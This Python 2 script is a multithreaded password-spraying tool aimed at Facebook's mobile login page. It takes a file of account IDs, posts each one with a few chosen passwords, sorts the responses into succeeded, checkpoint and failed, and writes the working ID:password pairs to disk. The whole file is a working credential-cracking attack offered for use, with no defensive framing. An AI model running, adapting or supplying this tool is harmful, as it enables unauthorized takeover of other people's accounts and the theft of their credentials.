import os
import requests
import re
import readline
import sys
import argparse
import time
import random
from multiprocessing.pool import ThreadPool
from datetime import timedelta

url = 'https://mbasic.facebook.com/login.php'
my_user_agent = 'Mozilla/5.0 (Linux; Android 7.0; 5060 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36'
path_default = os.path.join(os.environ['HOME'], 'hasil')

reload(sys)
sys.setdefaultencoding('utf-8')

# handle ctrl-C not working
class KeyboardInterruptError(Exception):
    pass

class crack:
    def __init__(self, filename, pw, th):
        self.id_list = [i.strip() for i in open(filename).readlines() if i.strip() != '' and i]
        if arg.random:
            random.shuffle(self.id_list)
        if arg.reverse:
            self.id_list = self.id_list[::-1]
        if arg.number:
            self.id_list = self.id_list[:arg.number]
        self.pw = pw
        # <-- data result -->
        self.data = {'succeeded': [],
                     'checkpoint': [],
                     'failed': []}
        self.t = 0
        self.raw = 0

        self.start = time.time()
        p = ThreadPool(int(th))
        try:
            p.map_async(self.run, self.id_list).get(9999)
        except KeyboardInterrupt:
            p.close()
        except Exception as e:
            p.terminate()
        self.print_data()
        p.close()

    def updt(self, progress, total, barLength=25, indi='#'):
        if total < progress:
            raise ValueError('progress is greater than total')

        elapsed = time.time() - self.start
        progress_ = float(progress) / float(total)
        block = int(round(barLength * progress_))
        text = "\r{0} [{1}] {2:.0f}% ({3}/{4} {5}) ".format(
            str(timedelta(seconds=elapsed)).split('.')[0],
            indi * block + "-" * (barLength - block),
            round(progress_ * 100, 0),
            progress, total, self.convertSize(self.raw)
           )
        sys.stdout.write(text)
        sys.stdout.flush()

    def convertSize(self, n, format='%(value).1f %(symbol)s', symbols='customary'):
        SYMBOLS = {
            'customary': ('B', 'K', 'Mb', 'G', 'T', 'P', 'E', 'Z', 'Y'),
            'customary_ext': ('byte', 'kilo', 'mega', 'giga', 'tera', 'peta', 'exa',
                              'zetta', 'iotta'),
            'iec': ('Bi', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi', 'Yi'),
            'iec_ext': ('byte', 'kibi', 'mebi', 'gibi', 'tebi', 'pebi', 'exbi',
                        'zebi', 'yobi'),
            }
        n = int(n)
        if n < 0:
            raise ValueError("n < 0")
        symbols = SYMBOLS[symbols]
        prefix = {}
        for i, s in enumerate(symbols[1:]):
            prefix[s] = 1 << (i + 1) * 10
        for symbol in reversed(symbols[1:]):
            if n >= prefix[symbol]:
                value = float(n) / prefix[symbol]
                return format % locals()

        return format % dict(symbol=symbols[0], value=n)

    def run(self, id):
        s = requests.Session()
        try:
            r = s.post(url,
                       data={'email': id, 'pass': self.pw},
                       headers={'User-Agent': my_user_agent})
            if re.search('(?:m_sess|home.php)', r.url):
                self.data['succeeded'].append(id)
            elif 'checkpoint' in r.url:
                self.data['checkpoint'].append(id)
            else:
                self.data['failed'].append(id)
        except KeyboardInterrupt:
            raise KeyboardInterruptError()
        except Exception:
            self.data['failed'].append(id)
        self.raw += len(r.text)
        self.t += 1
        self.updt(self.t, len(self.id_list))

    def print_data(self):
        print '\n'
        color = {'succeeded': '32', 'checkpoint': '33', 'failed': '31'}
        for i in ['succeeded', 'checkpoint', 'failed']:
            print '\x1b[{0}m# {1:<10}\x1b[0m -> \x1b[36m{2}\x1b[0m'.format(color[i], i, len(self.data[i]))
            if len(self.data[i]) > 0 and i != 'failed':
                for x in self.data[i]:
                    self.save_(i, x)
                    print '  -> {}:{}'.format(x, self.pw)
        print ''

    def save_(self, x, y):
        with open(os.path.join(path_default, x), 'a') as f:
            f.write('{}:{}\n'.format(y, self.pw))

def command_line():
    parser = argparse.ArgumentParser()
    parser.add_argument('usps', metavar='password', nargs='*', help='that will be used. maximum password 10')
    parser.add_argument('-a', '--random', action='store_true', help='randomize list before cracking')
    parser.add_argument('-r', '--reverse', action='store_true', help='starting from the last value')
    parser.add_argument('-p', dest='path',  help='password list that will be cracked', required=True)
    parser.add_argument('-t', dest='thread', help='number of thread, (default 20)', default=20, type=int)
    parser.add_argument('-l', dest='number', help='number of lists to be taken', type=int)
    return parser.parse_args()

def main():
    global arg
    arg = command_line()
    if not os.path.isdir(path_default):
        os.mkdir(path_default)
    if not os.path.isfile(arg.path):
        sys.exit("!: IOError: [Errno 2] No such file or directory: '%s'" % arg.path)
    if arg.usps:
        if len(arg.usps) > 10:
            arg.usps = arg.usps[:10]
        for s in arg.usps:
            if len(s) < 6:
                print '!: %s: password length must be more than 6 characters ..' % s
                continue
            print '!: author Val (zvtyrdt.id)\n!: github https://github.com/zevtyardt\n!: facebook https://m.facebook.com/zvtyrdt.id\n\n!: number of workers used {0}\n!: password used {1}\n\n!: start cracking the account..'.format(arg.thread, s)
            crack(arg.path, s, arg.thread)
    else:
        parser.print_usage()

if __name__ == '__main__':
    main()